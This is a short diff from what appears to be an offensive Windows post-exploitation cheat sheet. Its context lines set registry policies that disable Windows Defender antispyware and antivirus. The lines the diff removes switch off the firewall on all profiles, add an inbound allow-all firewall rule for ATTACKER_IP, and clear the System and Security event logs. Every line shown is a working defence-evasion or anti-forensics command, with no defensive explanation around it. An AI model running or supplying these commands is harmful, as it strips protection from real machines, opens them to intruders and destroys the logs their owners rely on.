@@ -34,14 +34,3 @@ reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywa
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 
 
-Netsh Advfirewall show allprofiles
-NetSh Advfirewall set allprofiles state off
-
-# ip whitelisting
-New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
-
-
-
-
-cmd.exe /c wevtutil.exe cl System
-cmd.exe /c wevtutil.exe cl Security
